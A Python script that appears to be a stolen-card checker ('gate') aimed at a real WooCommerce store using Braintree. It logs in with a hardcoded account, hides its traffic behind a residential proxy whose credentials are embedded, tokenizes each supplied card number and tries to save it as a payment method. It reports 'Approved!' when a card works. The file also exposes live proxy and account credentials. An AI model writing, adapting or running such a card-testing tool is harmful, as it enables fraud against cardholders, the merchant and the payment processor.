import urllib3
from requests import Session
from retry_requests import retry
from configbraintreee.ConfigsBraintree import BehaviorsBraintree
import requests
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class BraintreeAuthWoo:
    'Clase de la pagina que quedara como gate'
    def main(self,card):
        try: 
            self.session = requests.Session()
            self.session.proxies.update({'http://': 'http://17f478d14ce695e5:RNW78Fm5@res.proxy-seller.com:10000', 'https://': 'http://17f478d14ce695e5:RNW78Fm5@res.proxy-seller.com:10000'})

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Connection': 'keep-alive','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'none','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
            self.session.get('https://www2.caliper.com/', headers=headers)
            time.sleep(5)
            
            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Connection': 'keep-alive','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'none','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
            self.session.get('https://www2.caliper.com/store/', headers=headers)

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Connection': 'keep-alive','Referer': 'https://www2.caliper.com/store/','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-origin','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
            self.session.get('https://www2.caliper.com/store/my-account', headers=headers)
            time.sleep(5)
            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Connection': 'keep-alive','Referer': 'https://www2.caliper.com/store/','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-origin','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
            self.req_1 = self.session.get('https://www2.caliper.com/store/my-account/', headers=headers)
            self.nonce_login = BehaviorsBraintree().QueryText(self.req_1.text, 'name="woocommerce-login-nonce" value="','"')
            print(self.nonce_login)

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://www2.caliper.com','Referer': 'https://www2.caliper.com/store/my-account/','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-origin','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
            data = {
                'username': 'yuhiro890@gmail.com',
                'wfls-email-verification': '',
                'password': 'Cuenta1234',
                'woocommerce-login-nonce': self.nonce_login,
                '_wp_http_referer': '/store/my-account/',
                'login': 'Log in',
            }
            self.session.post('https://www2.caliper.com/store/my-account/', headers=headers, data=data)

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Referer': 'https://www2.caliper.com/store/my-account/','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-origin','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
            self.session.get('https://www2.caliper.com/store/my-account/', headers=headers)
        
            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Connection': 'keep-alive','Referer': 'https://www2.caliper.com/store/my-account/','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-origin','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
            self.req_2 = self.session.get('https://www2.caliper.com/store/my-account/payment-methods/', headers=headers)
            self.client_token_nonce = BehaviorsBraintree().QueryText(self.req_2.text,'"client_token_nonce":"','"')

            """headers = {'Accept': '*/*','Accept-Language': 'es-419,es;q=0.9','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://www2.caliper.com','Referer': 'https://www2.caliper.com/store/my-account/payment-methods/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36','X-Requested-With': 'XMLHttpRequest','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
            data = {
                'action': 'wc_braintree_payment_methods_log_script_event',
                'security': '05bfa8f87c',
                'name': 'TypeError',
                'message': 'event is not a function',
            }
            response = requests.post('https://www2.caliper.com/store/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
            """
            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Connection': 'keep-alive','Referer': 'https://www2.caliper.com/store/my-account/payment-methods/','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-origin','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
            self.req_3 = self.session.get('https://www2.caliper.com/store/my-account/add-payment-method/',  headers=headers)
            time.sleep(5)
            self.payment_nonce = BehaviorsBraintree().QueryText(self.req_3.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            self.client_token_nonce_2 = BehaviorsBraintree().QueryText(self.req_3.text,'"client_token_nonce":"','"')
            print(self.client_token_nonce_2)

            headers = {'Accept': '*/*','Accept-Language': 'es-419,es;q=0.9','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://www2.caliper.com','Referer': 'https://www2.caliper.com/store/my-account/add-payment-method/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36','X-Requested-With': 'XMLHttpRequest','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
            data = {
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': self.client_token_nonce_2,
            }
            self.req_4 = self.session.post('https://www2.caliper.com/store/wp-admin/admin-ajax.php', headers=headers, data=data)
            self.data_J = self.req_4.json()['data']
            self.client_eyj = BehaviorsBraintree().DecodeBear(self.data_J)
            self.session_client_id = BehaviorsBraintree().SessionId()
            self.ccs = BehaviorsBraintree().Ccs(card)

            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9','authorization': f'Bearer {self.client_eyj}','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','priority': 'u=1, i','referer': 'https://assets.braintreegateway.com/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': self.session_client_id,
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': self.ccs[0],
                            'expirationMonth': self.ccs[1],
                            'expirationYear': self.ccs[2],
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            self.req_5 = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            self.token_card = BehaviorsBraintree().QueryText(self.req_5.text,'{"token":"','"')

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://www2.caliper.com','Referer': 'https://www2.caliper.com/store/my-account/add-payment-method/','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-origin','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
            data = {
                'payment_method': 'braintree_credit_card',
                'wc-braintree-credit-card-card-type': 'visa',
                'wc-braintree-credit-card-3d-secure-enabled': '',
                'wc-braintree-credit-card-3d-secure-verified': '',
                'wc-braintree-credit-card-3d-secure-order-total': '1995.00',
                'wc_braintree_credit_card_payment_nonce': self.token_card,
                'wc_braintree_device_data': '{"correlation_id":"cd4f0acc62670b4d742f32d2daf33bbe"}',
                'wc-braintree-credit-card-tokenize-payment-method': 'true',
                'woocommerce-add-payment-method-nonce': self.payment_nonce,
                '_wp_http_referer': '/store/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }
            sexo = self.session.post('https://www2.caliper.com/store/my-account/add-payment-method/', headers=headers, data=data,)
            print(self.payment_nonce)

            with open('readme.html', 'w') as f:
                    f.write(f'{sexo.text}')

            

            self.session.close()
            if 'Nice! New payment method added' in sexo.text:  return 'Approved! ✅', '1000: Approved'
            error = BehaviorsBraintree().QueryText(sexo.text, 'class="woocommerce-error" role="alert">', '</li>').split('<li>')
            
            if error[1] == '\n\t\t\t\t\t': return 'Approved! ✅', '1000: Approved'
            
            else: 
                code = BehaviorsBraintree().Response(error[1].split('Status code ')[1].strip())
                return code
            
        except: 
            return 'Payment error: Gateway Rejected: risk_threshold'

        

